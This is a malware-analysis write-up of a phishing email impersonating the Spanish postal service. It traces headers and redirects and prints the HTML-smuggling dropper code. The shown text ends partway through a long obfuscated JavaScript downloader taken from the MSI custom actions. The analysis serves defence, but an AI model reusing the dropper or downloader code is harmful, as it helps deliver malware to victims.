## Phishing email delivering malware
### Date: 01/07/23
### Source: email
### Goal: Verify phishing email
### Languages: SMTP, JavaScript
---

1) The email below was sent to the victim.  

![Phishing email](./images/email.png?raw=true "Title")


The victim is Spanish and the colours and fonts resemble the Spanish Post Office. The text pretends to be a notification of a paquet failed delivery.

2) Although the email pretends to come from From: "CORREOS" <Correoformularioenlinea@gmail.com>, we can see that the email client is already complaining about the domain validation. If we look at the relevant email header we see:

```
Authentication-Results: mailin036.protonmail.ch; dmarc=fail (p=none dis=none) header.from=gmail.com
```

We can see that DMARC is failing due to the gmail.com address.

3) To find the real source of the email we need to check again the SMTP headers (`smtp-headers.txt`). We will focus on the  `Received:` headers, starting for the last one. As the SMTP headers are added by every new hop, the last one is the first that was included.

```
Received: from smtp344t7f233.saaspmta0002.correio.biz
 (smtp344t7f233.saaspmta0002.correio.biz [179.188.7.233]) (using TLSv1.3 with cipher
 TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256) (No
 client certificate requested) by mailin036.protonmail.ch (Postfix) with ESMTPS id
 4QrQbB4tlDz9vNQ1 for <VICTIM@DOMAIN>; Wed, 28 Jun 2023 02:32:22 +0000
 (UTC)
Received: from saasmilter0010.correio.biz (10.32.64.10) by
 smtp344t7f233.saaspmta0002.correio.biz id hjedk02oqm47 for
 <VICTIM@DOMAIN>; Tue, 27 Jun 2023 23:30:24 -0300 (envelope-from
 <bounce-f567ba3ac79aa6b3a0bebc264bd8e2d7@smtplw-11.com>)
Received: from saasqueue0004.correio.biz (unknown [10.32.64.7]) by
 saasmilter0010.correio.biz (Postfix) with ESMTP id 2EC27DFE91 for
 <VICTIM@DOMAIN>; Tue, 27 Jun 2023 23:32:15 -0300 (-03)
Received: from DESKTOP-9PQ4D53 (unknown [177.51.106.244]) (Authenticated sender: gur33zz)
 by saasauth0007.correio.pw (Postfix) with ESMTPA id F1AA018137A for
 <VICTIM@DOMAIN>; Tue, 27 Jun 2023 23:32:14 -0300 (-03)
```

which can be translated to:

![Phishing email](./images/email-flow.png?raw=true "Title")

The email source is not gmail, but a host in Brazil. Looking that the source is not a single residencial user, but we see several servers involved, that use DKIM and SPF, a potential root cause of the phising could be a fraudulent user account, "gur33zz" or stolen credentials. 

2) Lets see what is the payload of the phishing. If we look at the body of the email (`body-email.html.vir.zip`) we see that any interaction with the email with forward us to https://ip71.32.139.586ip.see-cure[.]de

 I personally like to follow the request manualy using curl, pretending to be a browser. I do this in case the attacker is fitlering based on User Agent.

```
curl -vv -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" "https://ip71.32.139.586ip.see-cure[.]de"

< HTTP/2 200
< server: nginx
< date: Wed, 28 Jun 2023 15:25:50 GMT
< content-type: text/html; charset=UTF-8
< content-length: 98
< x-powered-by: PHP/8.0.29
< vary: Accept-Encoding
< x-powered-by: PleskLin
<

<meta http-equiv='refresh' content='2;url=https://ip71.32.139.586ip.see-cure[.]de/index2.php'>
```


3) We see a redirect to a page in the same server:

```
curl -vv -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" "https://ip71.32.139.586ip.see-cure[.]de/index2.php"

< HTTP/2 200
< server: nginx
< date: Wed, 28 Jun 2023 15:26:40 GMT
< content-type: text/html; charset=UTF-8
< x-powered-by: PHP/8.0.29
< vary: Accept-Encoding
< x-powered-by: PleskLin
<

<meta http-equiv='refresh' content='2;url=https://zigzag-qualifier.000webhostapp[.]com/ramesp/02658034719.html'>

```

4) We are now redirected to a different server, `zigzag-qualifier.000webhostapp[.]com`, a free web hosting server. From this we can download the dropper.

```
curl -vv -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" "https://zigzag-qualifier.000webhostapp[.]com/ramesp/02658034719.html" -o output.html.vir

< HTTP/2 200
< date: Wed, 28 Jun 2023 15:28:23 GMT
< content-type: text/html; charset=UTF-8
< accept-ranges: bytes
< server: awex
< x-xss-protection: 1; mode=block
< x-content-type-options: nosniff
< x-request-id: d266db08543d17bb43f35fc13ef26301
<
```

This is a very large HTML that generates and delivers the payload. This can be found in the file `output.html.vir.zip`

5) If we look at the HTML we see a large variable with 996696 chars. The tail of the file only contains information about the free hosting service. If we trim the large variable and remove the tail, we have the following code:

```html
<html>
<head>
</head>
<body>
<script>
var YFuthSYribDtaVVHKPmPE = jcdebyaxkhtiqruzpgfv("");
var jheuyApsUxhmdNuwobFZR = new JSZip();
var anznCUaNOdcmcUvZFnxFL = "."+"z"+"i"+"p";
var hysWNeVEAQwzkrSOgbtDH = ".msi";
var FVAnuBHuvwnXomGKpNXRE = sxgdzqecviflnatjbpor(5)+iajwrzxoydkpufnbetvc(13)+""+anznCUaNOdcmcUvZFnxFL;
var DSBbKKTVMhmQASKEuYFII = sxgdzqecviflnatjbpor(5)+sxgdzqecviflnatjbpor(10)+PbNGIBjGOLYsIWldjvXpC(1)+hysWNeVEAQwzkrSOgbtDH;

function iajwrzxoydkpufnbetvc(tam) {
    var OpDZTVnETfLWIRGCmcMnJ = "";
    var ETvwlqfMoTVtJDcWGaiWM = "ABCDEFGHIJLMNOPQRSTUVXZWKYabcdefghijlmnopqrstuvxzwky1234567890";
    for (var i = 0; i < tam; i++)
        OpDZTVnETfLWIRGCmcMnJ += ETvwlqfMoTVtJDcWGaiWM.charAt(Math.floor(Math.random() * ETvwlqfMoTVtJDcWGaiWM.length));
    return OpDZTVnETfLWIRGCmcMnJ;
}

function sxgdzqecviflnatjbpor(tam) {
var jSzwDZnBGayLSFOkKIrwI = "";
var GkZFGOEtXZCywlHksbCaW = "ABCDEFGHIJLMNOPQRSTUVXZWKY";
for (var i = 0; i < tam; i++)
  jSzwDZnBGayLSFOkKIrwI += GkZFGOEtXZCywlHksbCaW.charAt(Math.floor(Math.random() * GkZFGOEtXZCywlHksbCaW.length));
return jSzwDZnBGayLSFOkKIrwI;
}


function PbNGIBjGOLYsIWldjvXpC(tam) {
var dsTpJKyPMKHqryjfXhRkT = "";
var rSQxooyKYzUOZirqCgygD = "���px;a~���M�.��";
for (var i = 0; i < tam; i++)
  dsTpJKyPMKHqryjfXhRkT += rSQxooyKYzUOZirqCgygD.charAt(Math.floor(Math.random() * rSQxooyKYzUOZirqCgygD.length));
return dsTpJKyPMKHqryjfXhRkT;
}

function jcdebyaxkhtiqruzpgfv(KoFoqunheCjkoIQcfJjzM) {
KoFoqunheCjkoIQcfJjzM = "0M8R4K7oIHgxGDAZlkmbaDv_REDUCED_FILE_AAAAAAAAAAAAAAAA==";
  var vNICYOSgXroXtNzjpDDaQ = window.atob(KoFoqunheCjkoIQcfJjzM);
  var len = vNICYOSgXroXtNzjpDDaQ.length;
  var KnuycpMhVsLHdTUTPhxcK = new Uint8Array( len );
  for (var i = 0; i < len; i++) {
    KnuycpMhVsLHdTUTPhxcK[i] = vNICYOSgXroXtNzjpDDaQ.charCodeAt(i);
  }
  return KnuycpMhVsLHdTUTPhxcK.buffer;
}
      jheuyApsUxhmdNuwobFZR.file(DSBbKKTVMhmQASKEuYFII,YFuthSYribDtaVVHKPmPE,{binary:true});
      jheuyApsUxhmdNuwobFZR.generateAsync({ type: "Blob" ,compression: "DEFLATE"}).then(function (content) { 
      saveAs(content, FVAnuBHuvwnXomGKpNXRE);
  });
</script>
</body>
</html>
```

6) We see some functions generating random strings. If we clean up the code and rename some variables and functions, we get the following cleaner code:

```html
<html>
<head>
</head>
<body>
<script>
var get_content = pack("");
var zipped_content = new JSZip();
var zip_file_name = random_name_generator2(5)+random_name_generator(13)+"zip";
var msi_file_name = random_name_generator2(5)+random_name_generator2(10)+random_non_ascii_char_generator(1)+".msi";

function random_name_generator(tam) {
    var name = "";
    var list_chars = "ABCDEFGHIJLMNOPQRSTUVXZWKYabcdefghijlmnopqrstuvxzwky1234567890";
    for (var i = 0; i < tam; i++)
        name += list_chars.charAt(Math.floor(Math.random() * list_chars.length));
    return name;
}

function random_name_generator2(tam) {
    var name = "";
    var list_chars_capital = "ABCDEFGHIJLMNOPQRSTUVXZWKY";
    for (var i = 0; i < tam; i++)
        name += list_chars_capital.charAt(Math.floor(Math.random() * list_chars_capital.length));
    return name;
}

function random_non_ascii_char_generator(tam) {
    var name = "";
    var non_ascci_list = "���px;a~���M�.��";
    for (var i = 0; i < tam; i++)
        name += non_ascci_list.charAt(Math.floor(Math.random() * non_ascci_list.length));
    return name;
}

function pack(input_content) {
    input_content = "0M8R4K7oIHgxGDAZlkmbaDv_REDUCED_AAAAAAAAAAAAAAAA==";
    var base64_decoded = window.atob(KoFoqunheCjkoIQcfJjzM);
    var len = base64_decoded.length;
    var buff_array = new Uint8Array( len );
    for (var i = 0; i < len; i++) {
        buff_array[i] = base64_decoded.charCodeAt(i);
    }
    return buff_array.buffer;
}

zipped_content.file(msi_file_name,get_content,{binary:true});
zipped_content.generateAsync({ type: "Blob" ,compression: "DEFLATE"}).then(function (content) 
    {
        saveAs(content, zip_file_name );
    });
</script>
</html>
```

We can see as the threat actor has three different functions just to generate the file names, always including one non ASCII character.
The payload is the BASE64 encoded content from the large variable we trimmed. What the HTML does is to use Javascript to decoded the base64 content, add a random name with extension .msi,  compress the content using DEFLAT compression, add another random name with the zip extnesion and deliver it to the victim.

7) If we execute the Javascript, it generates a file like the one at DTFHO4OMsmY4Wckrtb.zip.vir.zip. If we unzip it we find an MSI executable.

8) At the time of writting this, VirusTotal only finds detections in 2 engines:

![Virus Total](./images/vt01.png?raw=true "Virus Total")

VT list the following potentially malicious behaviours:
* Replication Through Removable Media
* Checks for available system drives (often done to infect USB drives)
* Windows Management Instrumentation
* Checks if Antivirus program is installed (via WMI)
* Registry Run Keys / Startup Folder
* Creates an autostart registry key
* Tries to load missing DLLs
* May try to detect the Windows Explorer process (often used for injection)
* Creates an autostart registry key
* Tries to load missing DLLs


9) I also uplodaded it to any.run that confirmed the suspicious behaviour:

![any.run](./images/anyrun01.png?raw=true "AnyRun")


10) Next is to look at the MSI file (I have removed the non ascii char from the name). I use `file` and `msiinfo` to view the file properties and unpack it:


```
~/cases/2306-PhishingCorreos$ file HYQTDYVEEESXAWM.msi
HYQTDYVEEESXAWM.msi: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, MSI Installer, Last Printed: Fri Dec 11 11:47:44 2009, Create Time/Date: Fri Dec 11 11:47:44 2009, Last Saved Time/Date: Fri Sep 18 15:06:51 2020, Security: 0, Code page: 1252, Revision Number: {F07FC024-4F2E-4077-8910-84D99800BFB2}, Number of Words: 10, Subject: rerefencia-correo-PDF, Author: correosevarltda, Name of Creating Application: Advanced Installer 18.7 build 0a7fdead, Template: ;1027, Comments: La base de dades del installador cont la lgica i les dades necessries per installar rerefencia-correo-PDF., Title: Installation Database, Keywords: Installer, MSI, Database, Number of Pages: 200
```

```
~/cases/2306-PhishingCorreos$ msiinfo tables HYQTDYVEEESXAWM.msi
_SummaryInformation
_ForceCodepage
Patch
Condition
AdvtExecuteSequence
PatchPackage
FeatureComponents
_Validation
AdminUISequence
TextStyle
Upgrade
UIText
AdminExecuteSequence
ActionText
ProgId
Binary
RadioButton
Icon
BootstrapperUISequence
ListBox
InstallUISequence
LaunchCondition
Control
Dialog
Property
Component
ControlEvent
CustomAction
ControlCondition
Feature
Directory
EventMapping
File
CheckBox
ComboBox
CreateFolder
Error
InstallExecuteSequence
ListView
Media
Registry
```

```
~/cases/2306-PhishingCorreos$ msiinfo streams HYQTDYVEEESXAWM.msi
Binary.New
Binary.Up
Icon.ext.exe
Binary.info
Binary.tabback
Binary.completi
Binary.custicon
Binary.exclamic
Binary.insticon
Binary.removico
Binary.repairic
Binary.banner.jpg
Binary.dialog.jpg
Binary.aicustact.dll
Binary.cmdlinkarrow
Binary.banner.scale150.jpg
Binary.banner.scale125.jpg
Binary.banner.scale200.jpg
Binary.dialog.scale150.jpg
Binary.dialog.scale125.jpg
Binary.dialog.scale200.jpg
SummaryInformation
```

```
~/cases/2306-PhishingCorreos$ msidump -s -t -d dump HYQTDYVEEESXAWM.msi
Exporting table _SummaryInformation...
Exporting table _ForceCodepage...
Exporting table Patch...
Exporting table Condition...
Exporting table AdvtExecuteSequence...
Exporting table PatchPackage...
Exporting table FeatureComponents...
Exporting table _Validation...
Exporting table AdminUISequence...
Exporting table TextStyle...
Exporting table Upgrade...
Exporting table UIText...
Exporting table AdminExecuteSequence...
Exporting table ActionText...
Exporting table ProgId...
Exporting table Binary...
Exporting table RadioButton...
Exporting table Icon...
Exporting table BootstrapperUISequence...
Exporting table ListBox...
Exporting table InstallUISequence...
Exporting table LaunchCondition...
Exporting table Control...
Exporting table Dialog...
Exporting table Property...
Exporting table Component...
Exporting table ControlEvent...
Exporting table CustomAction...
Exporting table ControlCondition...
Exporting table Feature...
Exporting table Directory...
Exporting table EventMapping...
Exporting table File...
Exporting table CheckBox...
Exporting table ComboBox...
Exporting table CreateFolder...
Exporting table Error...
Exporting table InstallExecuteSequence...
Exporting table ListView...
Exporting table Media...
Exporting table Registry...
Exporting stream Binary.New...
Exporting stream Binary.Up...
Exporting stream Icon.ext.exe...
Exporting stream Binary.info...
Exporting stream Binary.tabback...
Exporting stream Binary.completi...
Exporting stream Binary.custicon...
Exporting stream Binary.exclamic...
Exporting stream Binary.insticon...
Exporting stream Binary.removico...
Exporting stream Binary.repairic...
Exporting stream Binary.banner.jpg...
Exporting stream Binary.dialog.jpg...
Exporting stream Binary.aicustact.dll...
Exporting stream Binary.cmdlinkarrow...
Exporting stream Binary.banner.scale150.jpg...
Exporting stream Binary.banner.scale125.jpg...
Exporting stream Binary.banner.scale200.jpg...
Exporting stream Binary.dialog.scale150.jpg...
Exporting stream Binary.dialog.scale125.jpg...
Exporting stream Binary.dialog.scale200.jpg...
Exporting stream SummaryInformation...
```

12) In the `_Streams` we find the first interesting file, `Binary.aicustact.dll` but this is a dead end. We see that the dll is part of the "Advanced Installer" from Capyhon Ltd. We can see that the DLL is signed with a valid code sign certificate. The jpg images from the same folder are also part of the installer.

![Codesign certificate](./images/dll-certificate.png?raw=true "Codesign and timestamp")


13) If we look a the `InstallExecuteSequence.idt` we see the steps that MSI will follow.  The following line looks suspicious:

```
VAIVAIDIA24DEJUNH		6401
```
14) If we look now at `CustomAction.idt` we can see that `VAIVAIDIA24DEJUNH` is a large ofuscated Javascript:

```
~/cases/2306-PhishingCorreos$ cat dump/CustomAction.idt
Action	Type	Source	Target	ExtendedType
s72	i2	S72	S0	I4
CustomAction	Action
AI_DETECT_MODERNWIN	1	aicustact.dll	DetectModernWindows
AI_SET_ADMIN	51	AI_ADMIN	1
AI_InstallModeCheck	1	aicustact.dll	UpdateInstallMode
AI_SHOW_LOG	65	aicustact.dll	LaunchLogFile
AI_DpiContentScale	1	aicustact.dll	DpiContentScale
AI_EnableDebugLog	321	aicustact.dll	EnableDebugLog
AI_BACKUP_AI_SETUPEXEPATH	51	AI_SETUPEXEPATH_ORIGINAL	[AI_SETUPEXEPATH]
AI_DOWNGRADE	19		4010
AI_PREPARE_UPGRADE	65	aicustact.dll	PrepareUpgrade
AI_RESTORE_AI_SETUPEXEPATH	51	AI_SETUPEXEPATH	[AI_SETUPEXEPATH_ORIGINAL]
AI_RESTORE_LOCATION	65	aicustact.dll	RestoreLocation
AI_ResolveKnownFolders	1	aicustact.dll	AI_ResolveKnownFolders
AI_STORE_LOCATION	51	ARPINSTALLLOCATION	[APPDIR]
SET_APPDIR	307	APPDIR	[AppDataFolder][Manufacturer]\[ProductName]
SET_SHORTCUTDIR	307	SHORTCUTDIR	[ProgramMenuFolder][ProductName]
SET_TARGETDIR_TO_APPDIR	51	TARGETDIR	[APPDIR]
VAIVAIDIA24DEJUNH	101		var _0x49a11f=_0x3599;function _0x3599(_0x20601d,_0x4274a9){var _0xed654c=_0xed65();return _0x3599=function(_0x3599e2,_0x4c874e){_0x3599e2=_0x3599e2-0x6c;var _0x26664a=_0xed654c[_0x3599e2];return _0x26664a;},_0x3599(_0x20601d,_0x4274a9);}(function(_0x49cf32,_0x585f44){var _0x4b4871=_0x3599,_0x4f629f=_0x49cf32();while(!![]){try{var _0x54aa09=-parseInt(_0x4b4871(0x97))/0x1+-parseInt(_0x4b4871(0xb1))/0x2*(parseInt(_0x4b4871(0x7f))/0x3)+parseInt(_0x4b4871(0x98))/0x4*(-parseInt(_0x4b4871(0xac))/0x5)+parseInt(_0x4b4871(0x96))/0x6*(parseInt(_0x4b4871(0x8f))/0x7)+-parseInt(_0x4b4871(0x82))/0x8+-parseInt(_0x4b4871(0x7a))/0x9+parseInt(_0x4b4871(0xa0))/0xa*(parseInt(_0x4b4871(0x9e))/0xb);if(_0x54aa09===_0x585f44)break;else _0x4f629f['push'](_0x4f629f['shift']());}catch(_0x5dfe79){_0x4f629f['push'](_0x4f629f['shift']());}}}(_0xed65,0xcaa68));var _0x179b37=_0x4a8b;(function(_0x61fe90,_0x3d9dd5){var _0x52f4f4=_0x3599,_0x2bfb19=_0x4a8b,_0x5abe4a=_0x61fe90();while(!![]){try{var _0x376a55=parseInt(_0x2bfb19(0x218))/0x1+-parseInt(_0x2bfb19(0x1de))/0x2*(-parseInt(_0x2bfb19(0x1fa))/0x3)+parseInt(_0x2bfb19(0x1fc))/0x4*(parseInt(_0x2bfb19(0x1f9))/0x5)+parseInt(_0x2bfb19(0x20e))/0x6+parseInt(_0x2bfb19(0x1dc))/0x7*(parseInt(_0x2bfb19(0x1ea))/0x8)+-parseInt(_0x2bfb19(0x1ff))/0x9*(parseInt(_0x2bfb19(0x208))/0xa)+-parseInt(_0x2bfb19(0x1e8))/0xb;if(_0x376a55===_0x3d9dd5)break;else _0x5abe4a[_0x52f4f4(0xb0)](_0x5abe4a[_0x52f4f4(0x7e)]());}catch(_0x45dd2d){_0x5abe4a[_0x52f4f4(0xb0)](_0x5abe4a['shift']());}}}(_0xb6f0,0x44476));var _0x5b187b=_0x2da3;(function(_0x188961,_0x1b2304){var _0x54a27e=_0x3599,_0x5ef131=_0x4a8b,_0xab5c5e=_0x2da3,_0x452c32=_0x188961();while(!![]){try{var _0x235486=parseInt(_0xab5c5e(0xa1))/0x1+-parseInt(_0xab5c5e(0xb3))/0x2*(-parseInt(_0xab5c5e(0xba))/0x3)+parseInt(_0xab5c5e(0xcd))/0x4+-parseInt(_0xab5c5e(0x9d))/0x5+parseInt(_0xab5c5e(0xc2))/0x6*(-parseInt(_0xab5c5e(0xaf))/0x7)+parseInt(_0xab5c5e(0xcb))/0x8+parseInt(_0xab5c5e(0xa4))/0x9*(-parseInt(_0xab5c5e(0xa6))/0xa);if(_0x235486===_0x1b2304)break;else _0x452c32[_0x5ef131(0x1e6)](_0x452c32[_0x54a27e(0x7e)]());}catch(_0x25c123){_0x452c32[_0x5ef131(0x1e6)](_0x452c32[_0x5ef131(0x203)]());}}}(_0x2e30,0x7c19b));function GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x1630d6){var _0x242522=_0x4a8b,_0x4e69e0=_0x2da3;if(_0x1630d6=='')return;var _0x304268=xztuVd7U1SPEJIg6nUiU0fhFbsq9I5AAAjVMM6a36dOnhBL7eJ5FFhfE[_0x4e69e0(0xa9)],_0x42e586=-0x1,_0x32d869=0x0,_0x1cd30e='',_0x1408f0=0x0,_0x995a9=0x0,_0x385a05=0x0;_0x32d869=parseInt(_0x1630d6[_0x242522(0x20b)](0x0,0x2),0x10);for(_0x1408f0=0x2;_0x1408f0<_0x1630d6[_0x4e69e0(0xa9)];_0x1408f0+=0x2){_0x995a9=parseInt(_0x1630d6[_0x4e69e0(0xcf)](_0x1408f0,0x2),0x10),_0x42e586<_0x304268-0x1?_0x42e586++:_0x42e586=0x0,_0x385a05=_0x995a9^xztuVd7U1SPEJIg6nUiU0fhFbsq9I5AAAjVMM6a36dOnhBL7eJ5FFhfE[_0x4e69e0(0xbd)](_0x42e586),_0x385a05<=_0x32d869?_0x385a05=0xff+_0x385a05-_0x32d869:_0x385a05=_0x385a05-_0x32d869,_0x1cd30e+=String[_0x4e69e0(0xad)](_0x385a05),_0x32d869=_0x995a9;}return _0x1cd30e;}function t0ytlGKTYMbPE84LxFqFrqSWy1bMc2AV6T8gaXYNLXpV43BGoSpGPdI(_0x4dc38d){var _0x22b2e2=_0x3599,_0x486f37=_0x4a8b,_0x41865a=_0x2da3,_0x2d9211='',_0x24470d=_0x41865a(0xbb);for(var _0x42e222=0x0;_0x42e222<_0x4dc38d;_0x42e222++){_0x2d9211+=_0x24470d['charAt'](Math[_0x22b2e2(0x6c)](Math[_0x41865a(0xa2)]()*_0x24470d[_0x486f37(0x210)]));}return _0x2d9211;}function _0x2da3(_0x56f9ac,_0x2a8623){var _0x33eedd=_0x2e30();return _0x2da3=function(_0x39ce48,_0x4c2f06){_0x39ce48=_0x39ce48-0x97;var _0x16a909=_0x33eedd[_0x39ce48];return _0x16a909;},_0x2da3(_0x56f9ac,_0x2a8623);}function CdWB8pWOIMiCaOCzdFmmxvjlWIYif5jjp69mGcdAvheaKnEir8hLkVnS4Z(_0x3dad3e,_0x1f8605){var _0x715a57=_0x3599,_0x4afec3=_0x4a8b,_0x355fb2=_0x2da3,_0x226199,_0x6c94c9,_0x4d2560,_0x4fdd4f,_0x1346f9,_0x358144,_0x5e9253;try{_0x4fdd4f=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x355fb2(0x9b));var _0x1c641a=new ActiveXObject(_0x4fdd4f);_0x1c641a['SetTimeouts'](0x7530,0x7530,0x7530,0x1388),_0x358144=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x355fb2(0xc7)),void _0x1c641a[_0x355fb2(0xd1)](_0x358144,_0x3dad3e,![]),_0x1c641a[_0x355fb2(0xbc)]();if(_0x1c641a[_0x355fb2(0xbf)]==0x194)return![];;_0x1346f9=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x355fb2(0x99)),_0x226199=_0x1c641a[_0x1346f9];}catch(_0x5ed301){return![];};return _0x4d2560=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x355fb2(0xc4)),_0x5e9253=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x355fb2(0x9c)),_0x6c94c9=new ActiveXObject(_0x4d2560),_0x6c94c9[_0x5e9253]=0x1,_0x6c94c9[_0x355fb2(0xd1)](),_0x6c94c9[_0x4afec3(0x213)](_0x226199),_0x6c94c9[_0x355fb2(0xa3)](_0x1f8605,0x2),_0x6c94c9[_0x715a57(0x94)](),!![];}var xztuVd7U1SPEJIg6nUiU0fhFbsq9I5AAAjVMM6a36dOnhBL7eJ5FFhfE=_0x5b187b(0xc1),o9pC8Ho4LmBjLge0gd9kvcWZIxe9HKrFRwugn82ULsn3Q2i6VVrn8OxC6=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xb6)),ARQU3ygoRIoioDX7WeQPfsv9J5KTlvx7KUZcS1W19N4L6pGPzq2w=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xa7)),jTbuWN8jBCVEHEJ94RdOVvo75lc4PwECpV5eN60jlgXAzsG22Jb7o6CM0x2=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0x9a)),tv0XAbBuwARftwzQ1vqRPoc0DPoLi7gbeLOgdssRPOpLvmNRx2uUOq=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0x97)),XWqrz6digeqneiYXxjOfGnb85bHwaCNu6JBhuZRHelJHertu8cceeu=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xa8)),hh8aN6epbUcmBR3eXys5eGkYLpv614e2QqUVf2HCzdiVbcxsneOD5Xfe2d=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xb9)),WT1fM6T9y29aGKZxPx9gfp2Se8ayyJUM7URKedVzGIi1y1kZjkQ61ZXBWw=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xb2)),Fa33kG2qcD71XUwNvHj2k016pDvSmPO6UdtkGSLkCeOU5jDmSEUy1DP=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xc6)),LptnkNA7nrdDpYn68W5xwTsSgLLv3dDnnoaLi9DeDqqOJJmnAvUrOi0lej=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xb1)),iaVFH0uXneNnv1yMtZMoyqCiQMuxLatpOV0ikokDTggKBZoXlbzHPQo6N=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xa5)),dJ9Zm3pKB673ysAKVLuy4i3MMWcrn2Yv3EIxi1lTu0LjVQDdBiT=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xce)),nK4d3ZVQju0cDl7ykfCjGkzgztfu1djjqVSJt3dorumqBi755b5txf2Nzc=new ActiveXObject(ARQU3ygoRIoioDX7WeQPfsv9J5KTlvx7KUZcS1W19N4L6pGPzq2w),K2EWZcjGhiu2to8jeu0L5QId3rgEZGg9PGxjs0sZwV4gb1RCsaZL=nK4d3ZVQju0cDl7ykfCjGkzgztfu1djjqVSJt3dorumqBi755b5txf2Nzc[_0x179b37(0x1e4)](jTbuWN8jBCVEHEJ94RdOVvo75lc4PwECpV5eN60jlgXAzsG22Jb7o6CM0x2),UEu1RWXtlZfRXcAzRjHjfLrBpClgPqKzkGrXo9mDNllotds7oYube=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x49a11f(0xad)),E8A3z3gWwk8JrDOP8iE3W8g2xhbVKOD4d2G10qO2Y03W1geTmF2khrUla=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xb8)),gF5OaHC5Gqb1sRrGU3XnFtLhXDTR9XD69toip2mKxfTZB0KSQKAwNOhZ=K2EWZcjGhiu2to8jeu0L5QId3rgEZGg9PGxjs0sZwV4gb1RCsaZL+t0ytlGKTYMbPE84LxFqFrqSWy1bMc2AV6T8gaXYNLXpV43BGoSpGPdI(0x5)+UEu1RWXtlZfRXcAzRjHjfLrBpClgPqKzkGrXo9mDNllotds7oYube,ef0hibohZoc7TRX50mXRzdXFmJ19SYtfjX81Lme2HbAM3UBwsQOcW4q4=nK4d3ZVQju0cDl7ykfCjGkzgztfu1djjqVSJt3dorumqBi755b5txf2Nzc[_0x49a11f(0x80)](tv0XAbBuwARftwzQ1vqRPoc0DPoLi7gbeLOgdssRPOpLvmNRx2uUOq)+hh8aN6epbUcmBR3eXys5eGkYLpv614e2QqUVf2HCzdiVbcxsneOD5Xfe2d,WKgl1v6AthII56zr6j09uwB16HzVKkkVgUdvaRf7PvKhiMq91W1NRu=ef0hibohZoc7TRX50mXRzdXFmJ19SYtfjX81Lme2HbAM3UBwsQOcW4q4+gF5OaHC5Gqb1sRrGU3XnFtLhXDTR9XD69toip2mKxfTZB0KSQKAwNOhZ,yoQQ6c6gC6pzybirokybrML6FV5se3vdqobt6FUQWF1F0IvpJGwZ1e=new ActiveXObject(XWqrz6digeqneiYXxjOfGnb85bHwaCNu6JBhuZRHelJHertu8cceeu),PBHcCgFEnStZjDPayjszojpaphIiXM8Xx1KWAs8iBM5G0s0UYOoZx7mC=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xaa)),rIgGjp62CVbqOvHWzGVTauLBN5xmyqfZU7QyGfrLAJMSIXbkSXTfi=nK4d3ZVQju0cDl7ykfCjGkzgztfu1djjqVSJt3dorumqBi755b5txf2Nzc[_0x5b187b(0xb0)](PBHcCgFEnStZjDPayjszojpaphIiXM8Xx1KWAs8iBM5G0s0UYOoZx7mC)+hh8aN6epbUcmBR3eXys5eGkYLpv614e2QqUVf2HCzdiVbcxsneOD5Xfe2d,strneosorocontinuojacto=rIgGjp62CVbqOvHWzGVTauLBN5xmyqfZU7QyGfrLAJMSIXbkSXTfi+K2EWZcjGhiu2to8jeu0L5QId3rgEZGg9PGxjs0sZwV4gb1RCsaZL,YEVOQK8ZqZYER9bQG59u6zC2SFigeYcyupqh8LTDm6hEM8SHA3Z6J=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xb7)),DfEDQVCSiTdOV9zCgViH1eZu1X8gtHTjI17oa14nr0E9zyULNOjKGx=nK4d3ZVQju0cDl7ykfCjGkzgztfu1djjqVSJt3dorumqBi755b5txf2Nzc[_0x5b187b(0xb0)](YEVOQK8ZqZYER9bQG59u6zC2SFigeYcyupqh